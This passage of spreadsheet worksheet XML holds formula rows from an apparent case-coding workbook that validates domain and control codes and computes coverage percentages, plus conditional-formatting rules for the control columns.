        <f>IF(AI208="","",COUNTIF(N208:AG208,1))</f>
        <v/>
      </c>
      <c r="AL208" s="13">
        <f>IF(OR(AJ208="",AJ208=0),"",ROUND(100*(AJ208-AK208)/AJ208,1))</f>
        <v/>
      </c>
      <c r="AM208" s="11">
        <f>IF(AI208="","",IF(AI208=0,"No domain coded 1; ","")&amp;IF(M208="","Primary domain missing; ",IF(IFERROR(INDEX(E208:L208,1,M208),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N208:AG208)&lt;&gt;AJ208,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH208="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN208" s="13">
        <f>IF(AND(AI208&lt;&gt;"",AM208=""),1,0)</f>
        <v/>
      </c>
      <c r="AO208" s="14" t="n"/>
    </row>
    <row r="209">
      <c r="A209" s="11">
        <f>Cases!A209</f>
        <v/>
      </c>
      <c r="B209" s="11">
        <f>Cases!B209</f>
        <v/>
      </c>
      <c r="C209" s="11">
        <f>Cases!C209</f>
        <v/>
      </c>
      <c r="D209" s="11">
        <f>IF(Cases!F209="",LEFT(Cases!G209,120),Cases!F209)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E209:L209)=0,"",SUM(E209:L209))</f>
        <v/>
      </c>
      <c r="AJ209" s="13">
        <f>IF(AI209="","",N(E209)*3+N(F209)*2+N(G209)*2+N(H209)*2+N(I209)*2+N(J209)*3+N(K209)*3+N(L209)*3)</f>
        <v/>
      </c>
      <c r="AK209" s="13">
        <f>IF(AI209="","",COUNTIF(N209:AG209,1))</f>
        <v/>
      </c>
      <c r="AL209" s="13">
        <f>IF(OR(AJ209="",AJ209=0),"",ROUND(100*(AJ209-AK209)/AJ209,1))</f>
        <v/>
      </c>
      <c r="AM209" s="11">
        <f>IF(AI209="","",IF(AI209=0,"No domain coded 1; ","")&amp;IF(M209="","Primary domain missing; ",IF(IFERROR(INDEX(E209:L209,1,M209),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N209:AG209)&lt;&gt;AJ209,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH209="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN209" s="13">
        <f>IF(AND(AI209&lt;&gt;"",AM209=""),1,0)</f>
        <v/>
      </c>
      <c r="AO209" s="14" t="n"/>
    </row>
    <row r="210">
      <c r="A210" s="11">
        <f>Cases!A210</f>
        <v/>
      </c>
      <c r="B210" s="11">
        <f>Cases!B210</f>
        <v/>
      </c>
      <c r="C210" s="11">
        <f>Cases!C210</f>
        <v/>
      </c>
      <c r="D210" s="11">
        <f>IF(Cases!F210="",LEFT(Cases!G210,120),Cases!F210)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E210:L210)=0,"",SUM(E210:L210))</f>
        <v/>
      </c>
      <c r="AJ210" s="13">
        <f>IF(AI210="","",N(E210)*3+N(F210)*2+N(G210)*2+N(H210)*2+N(I210)*2+N(J210)*3+N(K210)*3+N(L210)*3)</f>
        <v/>
      </c>
      <c r="AK210" s="13">
        <f>IF(AI210="","",COUNTIF(N210:AG210,1))</f>
        <v/>
      </c>
      <c r="AL210" s="13">
        <f>IF(OR(AJ210="",AJ210=0),"",ROUND(100*(AJ210-AK210)/AJ210,1))</f>
        <v/>
      </c>
      <c r="AM210" s="11">
        <f>IF(AI210="","",IF(AI210=0,"No domain coded 1; ","")&amp;IF(M210="","Primary domain missing; ",IF(IFERROR(INDEX(E210:L210,1,M210),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N210:AG210)&lt;&gt;AJ210,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH210="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN210" s="13">
        <f>IF(AND(AI210&lt;&gt;"",AM210=""),1,0)</f>
        <v/>
      </c>
      <c r="AO210" s="14" t="n"/>
    </row>
    <row r="211">
      <c r="A211" s="11">
        <f>Cases!A211</f>
        <v/>
      </c>
      <c r="B211" s="11">
        <f>Cases!B211</f>
        <v/>
      </c>
      <c r="C211" s="11">
        <f>Cases!C211</f>
        <v/>
      </c>
      <c r="D211" s="11">
        <f>IF(Cases!F211="",LEFT(Cases!G211,120),Cases!F211)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E211:L211)=0,"",SUM(E211:L211))</f>
        <v/>
      </c>
      <c r="AJ211" s="13">
        <f>IF(AI211="","",N(E211)*3+N(F211)*2+N(G211)*2+N(H211)*2+N(I211)*2+N(J211)*3+N(K211)*3+N(L211)*3)</f>
        <v/>
      </c>
      <c r="AK211" s="13">
        <f>IF(AI211="","",COUNTIF(N211:AG211,1))</f>
        <v/>
      </c>
      <c r="AL211" s="13">
        <f>IF(OR(AJ211="",AJ211=0),"",ROUND(100*(AJ211-AK211)/AJ211,1))</f>
        <v/>
      </c>
      <c r="AM211" s="11">
        <f>IF(AI211="","",IF(AI211=0,"No domain coded 1; ","")&amp;IF(M211="","Primary domain missing; ",IF(IFERROR(INDEX(E211:L211,1,M211),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N211:AG211)&lt;&gt;AJ211,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH211="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN211" s="13">
        <f>IF(AND(AI211&lt;&gt;"",AM211=""),1,0)</f>
        <v/>
      </c>
      <c r="AO211" s="14" t="n"/>
    </row>
    <row r="212">
      <c r="A212" s="11">
        <f>Cases!A212</f>
        <v/>
      </c>
      <c r="B212" s="11">
        <f>Cases!B212</f>
        <v/>
      </c>
      <c r="C212" s="11">
        <f>Cases!C212</f>
        <v/>
      </c>
      <c r="D212" s="11">
        <f>IF(Cases!F212="",LEFT(Cases!G212,120),Cases!F212)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E212:L212)=0,"",SUM(E212:L212))</f>
        <v/>
      </c>
      <c r="AJ212" s="13">
        <f>IF(AI212="","",N(E212)*3+N(F212)*2+N(G212)*2+N(H212)*2+N(I212)*2+N(J212)*3+N(K212)*3+N(L212)*3)</f>
        <v/>
      </c>
      <c r="AK212" s="13">
        <f>IF(AI212="","",COUNTIF(N212:AG212,1))</f>
        <v/>
      </c>
      <c r="AL212" s="13">
        <f>IF(OR(AJ212="",AJ212=0),"",ROUND(100*(AJ212-AK212)/AJ212,1))</f>
        <v/>
      </c>
      <c r="AM212" s="11">
        <f>IF(AI212="","",IF(AI212=0,"No domain coded 1; ","")&amp;IF(M212="","Primary domain missing; ",IF(IFERROR(INDEX(E212:L212,1,M212),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N212:AG212)&lt;&gt;AJ212,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH212="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN212" s="13">
        <f>IF(AND(AI212&lt;&gt;"",AM212=""),1,0)</f>
        <v/>
      </c>
      <c r="AO212" s="14" t="n"/>
    </row>
    <row r="213">
      <c r="A213" s="11">
        <f>Cases!A213</f>
        <v/>
      </c>
      <c r="B213" s="11">
        <f>Cases!B213</f>
        <v/>
      </c>
      <c r="C213" s="11">
        <f>Cases!C213</f>
        <v/>
      </c>
      <c r="D213" s="11">
        <f>IF(Cases!F213="",LEFT(Cases!G213,120),Cases!F213)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E213:L213)=0,"",SUM(E213:L213))</f>
        <v/>
      </c>
      <c r="AJ213" s="13">
        <f>IF(AI213="","",N(E213)*3+N(F213)*2+N(G213)*2+N(H213)*2+N(I213)*2+N(J213)*3+N(K213)*3+N(L213)*3)</f>
        <v/>
      </c>
      <c r="AK213" s="13">
        <f>IF(AI213="","",COUNTIF(N213:AG213,1))</f>
        <v/>
      </c>
      <c r="AL213" s="13">
        <f>IF(OR(AJ213="",AJ213=0),"",ROUND(100*(AJ213-AK213)/AJ213,1))</f>
        <v/>
      </c>
      <c r="AM213" s="11">
        <f>IF(AI213="","",IF(AI213=0,"No domain coded 1; ","")&amp;IF(M213="","Primary domain missing; ",IF(IFERROR(INDEX(E213:L213,1,M213),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N213:AG213)&lt;&gt;AJ213,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH213="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN213" s="13">
        <f>IF(AND(AI213&lt;&gt;"",AM213=""),1,0)</f>
        <v/>
      </c>
      <c r="AO213" s="14" t="n"/>
    </row>
    <row r="214">
      <c r="A214" s="11">
        <f>Cases!A214</f>
        <v/>
      </c>
      <c r="B214" s="11">
        <f>Cases!B214</f>
        <v/>
      </c>
      <c r="C214" s="11">
        <f>Cases!C214</f>
        <v/>
      </c>
      <c r="D214" s="11">
        <f>IF(Cases!F214="",LEFT(Cases!G214,120),Cases!F214)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E214:L214)=0,"",SUM(E214:L214))</f>
        <v/>
      </c>
      <c r="AJ214" s="13">
        <f>IF(AI214="","",N(E214)*3+N(F214)*2+N(G214)*2+N(H214)*2+N(I214)*2+N(J214)*3+N(K214)*3+N(L214)*3)</f>
        <v/>
      </c>
      <c r="AK214" s="13">
        <f>IF(AI214="","",COUNTIF(N214:AG214,1))</f>
        <v/>
      </c>
      <c r="AL214" s="13">
        <f>IF(OR(AJ214="",AJ214=0),"",ROUND(100*(AJ214-AK214)/AJ214,1))</f>
        <v/>
      </c>
      <c r="AM214" s="11">
        <f>IF(AI214="","",IF(AI214=0,"No domain coded 1; ","")&amp;IF(M214="","Primary domain missing; ",IF(IFERROR(INDEX(E214:L214,1,M214),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N214:AG214)&lt;&gt;AJ214,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH214="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN214" s="13">
        <f>IF(AND(AI214&lt;&gt;"",AM214=""),1,0)</f>
        <v/>
      </c>
      <c r="AO214" s="14" t="n"/>
    </row>
    <row r="215">
      <c r="A215" s="11">
        <f>Cases!A215</f>
        <v/>
      </c>
      <c r="B215" s="11">
        <f>Cases!B215</f>
        <v/>
      </c>
      <c r="C215" s="11">
        <f>Cases!C215</f>
        <v/>
      </c>
      <c r="D215" s="11">
        <f>IF(Cases!F215="",LEFT(Cases!G215,120),Cases!F215)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E215:L215)=0,"",SUM(E215:L215))</f>
        <v/>
      </c>
      <c r="AJ215" s="13">
        <f>IF(AI215="","",N(E215)*3+N(F215)*2+N(G215)*2+N(H215)*2+N(I215)*2+N(J215)*3+N(K215)*3+N(L215)*3)</f>
        <v/>
      </c>
      <c r="AK215" s="13">
        <f>IF(AI215="","",COUNTIF(N215:AG215,1))</f>
        <v/>
      </c>
      <c r="AL215" s="13">
        <f>IF(OR(AJ215="",AJ215=0),"",ROUND(100*(AJ215-AK215)/AJ215,1))</f>
        <v/>
      </c>
      <c r="AM215" s="11">
        <f>IF(AI215="","",IF(AI215=0,"No domain coded 1; ","")&amp;IF(M215="","Primary domain missing; ",IF(IFERROR(INDEX(E215:L215,1,M215),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N215:AG215)&lt;&gt;AJ215,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH215="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN215" s="13">
        <f>IF(AND(AI215&lt;&gt;"",AM215=""),1,0)</f>
        <v/>
      </c>
      <c r="AO215" s="14" t="n"/>
    </row>
    <row r="216">
      <c r="A216" s="11">
        <f>Cases!A216</f>
        <v/>
      </c>
      <c r="B216" s="11">
        <f>Cases!B216</f>
        <v/>
      </c>
      <c r="C216" s="11">
        <f>Cases!C216</f>
        <v/>
      </c>
      <c r="D216" s="11">
        <f>IF(Cases!F216="",LEFT(Cases!G216,120),Cases!F216)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E216:L216)=0,"",SUM(E216:L216))</f>
        <v/>
      </c>
      <c r="AJ216" s="13">
        <f>IF(AI216="","",N(E216)*3+N(F216)*2+N(G216)*2+N(H216)*2+N(I216)*2+N(J216)*3+N(K216)*3+N(L216)*3)</f>
        <v/>
      </c>
      <c r="AK216" s="13">
        <f>IF(AI216="","",COUNTIF(N216:AG216,1))</f>
        <v/>
      </c>
      <c r="AL216" s="13">
        <f>IF(OR(AJ216="",AJ216=0),"",ROUND(100*(AJ216-AK216)/AJ216,1))</f>
        <v/>
      </c>
      <c r="AM216" s="11">
        <f>IF(AI216="","",IF(AI216=0,"No domain coded 1; ","")&amp;IF(M216="","Primary domain missing; ",IF(IFERROR(INDEX(E216:L216,1,M216),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N216:AG216)&lt;&gt;AJ216,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH216="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN216" s="13">
        <f>IF(AND(AI216&lt;&gt;"",AM216=""),1,0)</f>
        <v/>
      </c>
      <c r="AO216" s="14" t="n"/>
    </row>
    <row r="217">
      <c r="A217" s="11">
        <f>Cases!A217</f>
        <v/>
      </c>
      <c r="B217" s="11">
        <f>Cases!B217</f>
        <v/>
      </c>
      <c r="C217" s="11">
        <f>Cases!C217</f>
        <v/>
      </c>
      <c r="D217" s="11">
        <f>IF(Cases!F217="",LEFT(Cases!G217,120),Cases!F217)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E217:L217)=0,"",SUM(E217:L217))</f>
        <v/>
      </c>
      <c r="AJ217" s="13">
        <f>IF(AI217="","",N(E217)*3+N(F217)*2+N(G217)*2+N(H217)*2+N(I217)*2+N(J217)*3+N(K217)*3+N(L217)*3)</f>
        <v/>
      </c>
      <c r="AK217" s="13">
        <f>IF(AI217="","",COUNTIF(N217:AG217,1))</f>
        <v/>
      </c>
      <c r="AL217" s="13">
        <f>IF(OR(AJ217="",AJ217=0),"",ROUND(100*(AJ217-AK217)/AJ217,1))</f>
        <v/>
      </c>
      <c r="AM217" s="11">
        <f>IF(AI217="","",IF(AI217=0,"No domain coded 1; ","")&amp;IF(M217="","Primary domain missing; ",IF(IFERROR(INDEX(E217:L217,1,M217),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N217:AG217)&lt;&gt;AJ217,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH217="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN217" s="13">
        <f>IF(AND(AI217&lt;&gt;"",AM217=""),1,0)</f>
        <v/>
      </c>
      <c r="AO217" s="14" t="n"/>
    </row>
    <row r="218">
      <c r="A218" s="11">
        <f>Cases!A218</f>
        <v/>
      </c>
      <c r="B218" s="11">
        <f>Cases!B218</f>
        <v/>
      </c>
      <c r="C218" s="11">
        <f>Cases!C218</f>
        <v/>
      </c>
      <c r="D218" s="11">
        <f>IF(Cases!F218="",LEFT(Cases!G218,120),Cases!F218)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E218:L218)=0,"",SUM(E218:L218))</f>
        <v/>
      </c>
      <c r="AJ218" s="13">
        <f>IF(AI218="","",N(E218)*3+N(F218)*2+N(G218)*2+N(H218)*2+N(I218)*2+N(J218)*3+N(K218)*3+N(L218)*3)</f>
        <v/>
      </c>
      <c r="AK218" s="13">
        <f>IF(AI218="","",COUNTIF(N218:AG218,1))</f>
        <v/>
      </c>
      <c r="AL218" s="13">
        <f>IF(OR(AJ218="",AJ218=0),"",ROUND(100*(AJ218-AK218)/AJ218,1))</f>
        <v/>
      </c>
      <c r="AM218" s="11">
        <f>IF(AI218="","",IF(AI218=0,"No domain coded 1; ","")&amp;IF(M218="","Primary domain missing; ",IF(IFERROR(INDEX(E218:L218,1,M218),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N218:AG218)&lt;&gt;AJ218,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH218="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN218" s="13">
        <f>IF(AND(AI218&lt;&gt;"",AM218=""),1,0)</f>
        <v/>
      </c>
      <c r="AO218" s="14" t="n"/>
    </row>
    <row r="219">
      <c r="A219" s="11">
        <f>Cases!A219</f>
        <v/>
      </c>
      <c r="B219" s="11">
        <f>Cases!B219</f>
        <v/>
      </c>
      <c r="C219" s="11">
        <f>Cases!C219</f>
        <v/>
      </c>
      <c r="D219" s="11">
        <f>IF(Cases!F219="",LEFT(Cases!G219,120),Cases!F219)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E219:L219)=0,"",SUM(E219:L219))</f>
        <v/>
      </c>
      <c r="AJ219" s="13">
        <f>IF(AI219="","",N(E219)*3+N(F219)*2+N(G219)*2+N(H219)*2+N(I219)*2+N(J219)*3+N(K219)*3+N(L219)*3)</f>
        <v/>
      </c>
      <c r="AK219" s="13">
        <f>IF(AI219="","",COUNTIF(N219:AG219,1))</f>
        <v/>
      </c>
      <c r="AL219" s="13">
        <f>IF(OR(AJ219="",AJ219=0),"",ROUND(100*(AJ219-AK219)/AJ219,1))</f>
        <v/>
      </c>
      <c r="AM219" s="11">
        <f>IF(AI219="","",IF(AI219=0,"No domain coded 1; ","")&amp;IF(M219="","Primary domain missing; ",IF(IFERROR(INDEX(E219:L219,1,M219),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N219:AG219)&lt;&gt;AJ219,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH219="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN219" s="13">
        <f>IF(AND(AI219&lt;&gt;"",AM219=""),1,0)</f>
        <v/>
      </c>
      <c r="AO219" s="14" t="n"/>
    </row>
    <row r="220">
      <c r="A220" s="11">
        <f>Cases!A220</f>
        <v/>
      </c>
      <c r="B220" s="11">
        <f>Cases!B220</f>
        <v/>
      </c>
      <c r="C220" s="11">
        <f>Cases!C220</f>
        <v/>
      </c>
      <c r="D220" s="11">
        <f>IF(Cases!F220="",LEFT(Cases!G220,120),Cases!F220)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E220:L220)=0,"",SUM(E220:L220))</f>
        <v/>
      </c>
      <c r="AJ220" s="13">
        <f>IF(AI220="","",N(E220)*3+N(F220)*2+N(G220)*2+N(H220)*2+N(I220)*2+N(J220)*3+N(K220)*3+N(L220)*3)</f>
        <v/>
      </c>
      <c r="AK220" s="13">
        <f>IF(AI220="","",COUNTIF(N220:AG220,1))</f>
        <v/>
      </c>
      <c r="AL220" s="13">
        <f>IF(OR(AJ220="",AJ220=0),"",ROUND(100*(AJ220-AK220)/AJ220,1))</f>
        <v/>
      </c>
      <c r="AM220" s="11">
        <f>IF(AI220="","",IF(AI220=0,"No domain coded 1; ","")&amp;IF(M220="","Primary domain missing; ",IF(IFERROR(INDEX(E220:L220,1,M220),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N220:AG220)&lt;&gt;AJ220,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH220="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN220" s="13">
        <f>IF(AND(AI220&lt;&gt;"",AM220=""),1,0)</f>
        <v/>
      </c>
      <c r="AO220" s="14" t="n"/>
    </row>
    <row r="221">
      <c r="A221" s="11">
        <f>Cases!A221</f>
        <v/>
      </c>
      <c r="B221" s="11">
        <f>Cases!B221</f>
        <v/>
      </c>
      <c r="C221" s="11">
        <f>Cases!C221</f>
        <v/>
      </c>
      <c r="D221" s="11">
        <f>IF(Cases!F221="",LEFT(Cases!G221,120),Cases!F221)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E221:L221)=0,"",SUM(E221:L221))</f>
        <v/>
      </c>
      <c r="AJ221" s="13">
        <f>IF(AI221="","",N(E221)*3+N(F221)*2+N(G221)*2+N(H221)*2+N(I221)*2+N(J221)*3+N(K221)*3+N(L221)*3)</f>
        <v/>
      </c>
      <c r="AK221" s="13">
        <f>IF(AI221="","",COUNTIF(N221:AG221,1))</f>
        <v/>
      </c>
      <c r="AL221" s="13">
        <f>IF(OR(AJ221="",AJ221=0),"",ROUND(100*(AJ221-AK221)/AJ221,1))</f>
        <v/>
      </c>
      <c r="AM221" s="11">
        <f>IF(AI221="","",IF(AI221=0,"No domain coded 1; ","")&amp;IF(M221="","Primary domain missing; ",IF(IFERROR(INDEX(E221:L221,1,M221),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N221:AG221)&lt;&gt;AJ221,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH221="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN221" s="13">
        <f>IF(AND(AI221&lt;&gt;"",AM221=""),1,0)</f>
        <v/>
      </c>
      <c r="AO221" s="14" t="n"/>
    </row>
    <row r="222">
      <c r="A222" s="11">
        <f>Cases!A222</f>
        <v/>
      </c>
      <c r="B222" s="11">
        <f>Cases!B222</f>
        <v/>
      </c>
      <c r="C222" s="11">
        <f>Cases!C222</f>
        <v/>
      </c>
      <c r="D222" s="11">
        <f>IF(Cases!F222="",LEFT(Cases!G222,120),Cases!F222)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E222:L222)=0,"",SUM(E222:L222))</f>
        <v/>
      </c>
      <c r="AJ222" s="13">
        <f>IF(AI222="","",N(E222)*3+N(F222)*2+N(G222)*2+N(H222)*2+N(I222)*2+N(J222)*3+N(K222)*3+N(L222)*3)</f>
        <v/>
      </c>
      <c r="AK222" s="13">
        <f>IF(AI222="","",COUNTIF(N222:AG222,1))</f>
        <v/>
      </c>
      <c r="AL222" s="13">
        <f>IF(OR(AJ222="",AJ222=0),"",ROUND(100*(AJ222-AK222)/AJ222,1))</f>
        <v/>
      </c>
      <c r="AM222" s="11">
        <f>IF(AI222="","",IF(AI222=0,"No domain coded 1; ","")&amp;IF(M222="","Primary domain missing; ",IF(IFERROR(INDEX(E222:L222,1,M222),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N222:AG222)&lt;&gt;AJ222,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH222="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN222" s="13">
        <f>IF(AND(AI222&lt;&gt;"",AM222=""),1,0)</f>
        <v/>
      </c>
      <c r="AO222" s="14" t="n"/>
    </row>
    <row r="223">
      <c r="A223" s="11">
        <f>Cases!A223</f>
        <v/>
      </c>
      <c r="B223" s="11">
        <f>Cases!B223</f>
        <v/>
      </c>
      <c r="C223" s="11">
        <f>Cases!C223</f>
        <v/>
      </c>
      <c r="D223" s="11">
        <f>IF(Cases!F223="",LEFT(Cases!G223,120),Cases!F223)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E223:L223)=0,"",SUM(E223:L223))</f>
        <v/>
      </c>
      <c r="AJ223" s="13">
        <f>IF(AI223="","",N(E223)*3+N(F223)*2+N(G223)*2+N(H223)*2+N(I223)*2+N(J223)*3+N(K223)*3+N(L223)*3)</f>
        <v/>
      </c>
      <c r="AK223" s="13">
        <f>IF(AI223="","",COUNTIF(N223:AG223,1))</f>
        <v/>
      </c>
      <c r="AL223" s="13">
        <f>IF(OR(AJ223="",AJ223=0),"",ROUND(100*(AJ223-AK223)/AJ223,1))</f>
        <v/>
      </c>
      <c r="AM223" s="11">
        <f>IF(AI223="","",IF(AI223=0,"No domain coded 1; ","")&amp;IF(M223="","Primary domain missing; ",IF(IFERROR(INDEX(E223:L223,1,M223),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N223:AG223)&lt;&gt;AJ223,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH223="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN223" s="13">
        <f>IF(AND(AI223&lt;&gt;"",AM223=""),1,0)</f>
        <v/>
      </c>
      <c r="AO223" s="14" t="n"/>
    </row>
    <row r="224">
      <c r="A224" s="11">
        <f>Cases!A224</f>
        <v/>
      </c>
      <c r="B224" s="11">
        <f>Cases!B224</f>
        <v/>
      </c>
      <c r="C224" s="11">
        <f>Cases!C224</f>
        <v/>
      </c>
      <c r="D224" s="11">
        <f>IF(Cases!F224="",LEFT(Cases!G224,120),Cases!F224)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E224:L224)=0,"",SUM(E224:L224))</f>
        <v/>
      </c>
      <c r="AJ224" s="13">
        <f>IF(AI224="","",N(E224)*3+N(F224)*2+N(G224)*2+N(H224)*2+N(I224)*2+N(J224)*3+N(K224)*3+N(L224)*3)</f>
        <v/>
      </c>
      <c r="AK224" s="13">
        <f>IF(AI224="","",COUNTIF(N224:AG224,1))</f>
        <v/>
      </c>
      <c r="AL224" s="13">
        <f>IF(OR(AJ224="",AJ224=0),"",ROUND(100*(AJ224-AK224)/AJ224,1))</f>
        <v/>
      </c>
      <c r="AM224" s="11">
        <f>IF(AI224="","",IF(AI224=0,"No domain coded 1; ","")&amp;IF(M224="","Primary domain missing; ",IF(IFERROR(INDEX(E224:L224,1,M224),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N224:AG224)&lt;&gt;AJ224,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH224="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN224" s="13">
        <f>IF(AND(AI224&lt;&gt;"",AM224=""),1,0)</f>
        <v/>
      </c>
      <c r="AO224" s="14" t="n"/>
    </row>
  </sheetData>
  <conditionalFormatting sqref="N2:N224">
    <cfRule type="expression" priority="1" dxfId="0" stopIfTrue="1">
      <formula>$E2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="O2:O224">
    <cfRule type="expression" priority="2" dxfId="0" stopIfTrue="1">
      <formula>$E2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="P2:P224">
    <cfRule type="expression" priority="3" dxfId="0" stopIfTrue="1">
      <formula>$E2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="Q2:Q224">
    <cfRule type="expression" priority="4" dxfId="0" stopIfTrue="1">
      <formula>$F2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="R2:R224">
    <cfRule type="expression" priority="5" dxfId="0" stopIfTrue="1">
      <formula>$F2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="S2:S224">
    <cfRule type="expression" priority="6" dxfId="0" stopIfTrue="1">
      <formula>$G2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="T2:T224">
    <cfRule type="expression" priority="7" dxfId="0" stopIfTrue="1">
      <formula>$G2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="U2:U224">
    <cfRule type="expression" priority="8" dxfId="0" stopIfTrue="1">
      <formula>$H2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="V2:V224">
    <cfRule type="expression" priority="9" dxfId="0" stopIfTrue="1">
      <formula>$H2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="W2:W224">
    <cfRule type="expression" priority="10" dxfId="0" stopIfTrue="1">
      <formula>$I2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="X2:X224">
    <cfRule type="expression" priority="11" dxfId="0" stopIfTrue="1">
      <formula>$I2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="Y2:Y224">
    <cfRule type="expression" priority="12" dxfId="0" stopIfTrue="1">
      <formula>$J2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="Z2:Z224">
    <cfRule type="expression" priority="13" dxfId="0" stopIfTrue="1">
      <formula>$J2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AA2:AA224">
    <cfRule type="expression" priority="14" dxfId="0" stopIfTrue="1">
      <formula>$J2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AB2:AB224">
    <cfRule type="expression" priority="15" dxfId="0" stopIfTrue="1">
      <formula>$K2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AC2:AC224">
    <cfRule type="expression" priority="16" dxfId="0" stopIfTrue="1">
      <formula>$K2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AD2:AD224">
    <cfRule type="expression" priority="17" dxfId="0" stopIfTrue="1">
      <formula>$K2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AE2:AE224">
    <cfRule type="expression" priority="18" dxfId="0" stopIfTrue="1">
      <formula>$L2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AF2:AF224">
    <cfRule type="expression" priority="19" dxfId="0" stopIfTrue="1">
      <formula>$L2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AG2:AG224">
    <cfRule type="expression" priority="20" dxfId="0" stopIfTrue="1">
      <formula>$L2=0</formula>
    </cfRule>
  </conditionalFormatting>
